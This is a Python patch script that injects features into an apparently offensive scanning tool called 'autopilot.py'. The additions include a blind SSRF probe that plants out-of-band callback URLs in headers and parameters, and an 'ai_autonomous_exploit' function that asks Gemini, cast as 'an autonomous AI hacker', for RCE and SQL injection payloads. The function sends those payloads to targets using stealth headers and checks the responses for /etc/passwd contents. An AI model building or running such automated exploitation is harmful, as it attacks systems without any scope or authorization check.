import re

with open("autopilot.py", "r", encoding="utf-8") as f:
    code = f.read()

# Add missing env vars
if "INTERACTSH_URL" not in code:
    code = code.replace(
        'SHODAN_API_KEY = ENV_VARS.get("SHODAN_API_KEY", "")\n',
        'SHODAN_API_KEY = ENV_VARS.get("SHODAN_API_KEY", "")\nNOTION_API_KEY = ENV_VARS.get("NOTION_API_KEY", "")\nNOTION_DATABASE_ID = ENV_VARS.get("NOTION_DATABASE_ID", "")\nINTERACTSH_URL = ENV_VARS.get("INTERACTSH_URL", "")\nNEO4J_URI = ENV_VARS.get("NEO4J_URI", "bolt://neo4j:7687")\nNEO4J_USER = ENV_VARS.get("NEO4J_USER", "neo4j")\nNEO4J_PASSWORD = ENV_VARS.get("NEO4J_PASSWORD", "password123")\n'
    )

# Add notion ticket function
notion_func = """
def create_notion_ticket(finding):
    if not NOTION_API_KEY or "your_" in NOTION_API_KEY: return
    if not NOTION_DATABASE_ID or "your_" in NOTION_DATABASE_ID: return
    try:
        url = "https://api.notion.com/v1/pages"
        headers = {"Authorization": f"Bearer {NOTION_API_KEY}", "Content-Type": "application/json", "Notion-Version": "2022-06-28"}
        data = {
            "parent": { "database_id": NOTION_DATABASE_ID },
            "properties": {
                "Name": { "title": [ { "text": { "content": f"[{finding.get('severity')}] {finding.get('type')} on {finding.get('program')}" } } ] },
                "Status": { "status": { "name": "Triage" } },
                "Severity": { "select": { "name": finding.get('severity') } },
                "URL": { "url": finding.get('url') }
            }
        }
        requests.post(url, headers=headers, json=data, timeout=5)
    except: pass
"""
if "def create_notion_ticket" not in code:
    code = code.replace("def log(msg):", notion_func + "\ndef log(msg):")

# Add blind SSRF function
blind_func = """
def check_blind_oob(url):
    if not INTERACTSH_URL or "your_" in INTERACTSH_URL: return None
    try:
        headers = get_stealth_headers()
        headers["X-Forwarded-For"] = f"http://{INTERACTSH_URL}"
        headers["User-Agent"] = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) curl/7.68.0 http://{INTERACTSH_URL}"
        test_url = f"{url}?callback=http://{INTERACTSH_URL}&url=http://{INTERACTSH_URL}"
        requests.get(test_url, headers=headers, timeout=3, verify=False)
    except: pass
    return None
"""
if "def check_blind_oob" not in code:
    code = code.replace("def check_cors(url):", blind_func + "\ndef check_cors(url):")

# Add headless SPA function
headless_func = """
def check_headless_spa(url):
    findings = []
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            browser = p.chromium.launch(headless=True)
            page = browser.new_page()
            def handle_request(request):
                if "api" in request.url and request.method in ["POST", "PUT", "DELETE"]:
                    findings.append({"type": "HIDDEN_API_STATE_CHANGE", "url": request.url, "severity": "MEDIUM", "detail": f"Discovered background {request.method} API call via Headless SPA render"})
            page.on("request", handle_request)
            page.goto(url, timeout=10000, wait_until="networkidle")
            browser.close()
    except Exception: pass
    return findings if findings else None
"""
if "def check_headless_spa" not in code:
    code = code.replace("def check_cors(url):", headless_func + "\ndef check_cors(url):")

# Add push_to_graph
neo4j_func = """
def push_to_graph(finding):
    try:
        from neo4j import GraphDatabase
        driver = GraphDatabase.driver(NEO4J_URI, auth=(NEO4J_USER, NEO4J_PASSWORD))
        program = finding.get('program', 'unknown')
        url = finding.get('url', '')
        v_type = finding.get('type', 'unknown')
        severity = finding.get('severity', 'LOW')
        domain = urlparse(url).hostname if url else "unknown"
        query = '''
        MERGE (p:Program {name: $program})
        MERGE (d:Domain {name: $domain})
        MERGE (v:Vulnerability {type: $v_type, url: $url, severity: $severity})
        MERGE (p)-[:OWNS]->(d)
        MERGE (d)-[:HAS_VULN]->(v)
        '''
        with driver.session() as session:
            session.run(query, program=program, domain=domain, v_type=v_type, url=url, severity=severity)
        driver.close()
    except Exception as e: pass
"""
if "def push_to_graph" not in code:
    code = code.replace("def check_cors(url):", neo4j_func + "\ndef check_cors(url):")

# Add ai_autonomous_exploit
ai_exploit_func = """
def ai_autonomous_exploit(url):
    if not GEMINI_API_KEY or "your_" in GEMINI_API_KEY: return None
    log(f"[*] Autonomous AI analyzing {url} for custom exploits...")
    prompt = f"You are an autonomous AI hacker. Analyze this URL: {url}. Provide exactly 3 highly advanced, context-specific payload strings (separated by newlines) to inject into its parameters for RCE or advanced SQLi. Do not include any explanations, just the raw payloads."
    api_url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
    payload = {"contents": [{"parts":[{"text": prompt}]}]}
    findings = []
    try:
        r = requests.post(api_url, json=payload, headers={"Content-Type": "application/json"}, timeout=10)
        payloads = r.json()['candidates'][0]['content']['parts'][0]['text'].strip().split('\\n')
        for p in payloads:
            p = p.strip().strip('"').strip("'")
            if not p: continue
            headers = get_stealth_headers()
            test_url = f"{url}?id={requests.utils.quote(p)}&q={requests.utils.quote(p)}"
            resp = requests.get(test_url, headers=headers, timeout=5, verify=False)
            if "root:x:0:0" in resp.text or "syntax error" in resp.text.lower():
                findings.append({"type": "AI_AUTONOMOUS_EXPLOIT_SUCCESS", "url": test_url, "severity": "CRITICAL", "detail": f"AI Successfully exploited endpoint using custom payload: {p[:30]}..."})
    except: pass
    return findings if findings else None
"""
if "def ai_autonomous_exploit" not in code:
    code = code.replace("def check_cors(url):", ai_exploit_func + "\ndef check_cors(url):")

# Add generate_nuclei_template
ai_nuclei_func = """
def generate_nuclei_template(finding):
    if not GEMINI_API_KEY or "your_" in GEMINI_API_KEY: return
    if finding.get("type") not in ["AI_AUTONOMOUS_EXPLOIT_SUCCESS", "HIDDEN_API_STATE_CHANGE"]: return
    template_dir = Path("custom-templates")
    template_dir.mkdir(exist_ok=True)
    prompt = f"You are a security engineer writing a Nuclei YAML template.\\nBased on this finding:\\nType: {finding.get('type')}\\nURL: {finding.get('url')}\\nDetail: {finding.get('detail')}\\n\\nWrite a raw Nuclei YAML template. Do NOT use markdown code blocks."
    url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={GEMINI_API_KEY}"
    payload = {"contents": [{"parts":[{"text": prompt}]}]}
    try:
        import time
        r = requests.post(url, json=payload, headers={"Content-Type": "application/json"}, timeout=10)
        yaml_content = r.json()['candidates'][0]['content']['parts'][0]['text'].strip()
        if yaml_content.startswith("```yaml"): yaml_content = yaml_content[7:]
        if yaml_content.endswith("```"): yaml_content = yaml_content[:-3]
        yaml_content = yaml_content.strip()
        safe_id = f"ai_template_{int(time.time())}.yaml"
        template_path = template_dir / safe_id
        template_path.write_text(yaml_content, encoding="utf-8")
        log(f"[+] AI self-learned and generated a new custom Nuclei template at {template_path}")
    except Exception as e: pass
"""
if "def generate_nuclei_template" not in code:
    code = code.replace("def check_cors(url):", ai_nuclei_func + "\ndef check_cors(url):")

# Hook into engine
engine_additions = """
            tasks.append(executor.submit(check_blind_oob, b))
            tasks.append(executor.submit(check_headless_spa, b))
            tasks.append(executor.submit(ai_autonomous_exploit, b))
"""
if "check_blind_oob" not in code.split("def scan_target_fast")[1]:
    code = code.replace("tasks.append(executor.submit(check_js_secrets, b))", "tasks.append(executor.submit(check_js_secrets, b))" + engine_additions)

main_additions = """
            create_notion_ticket(f)
            push_to_graph(f)
            generate_nuclei_template(f)
"""
if "push_to_graph" not in code.split("def main():")[1]:
    code = code.replace("generate_ai_report(f)", "generate_ai_report(f)" + main_additions)

with open("autopilot.py", "w", encoding="utf-8") as f:
    f.write(code)

print("Injected all features cleanly.")
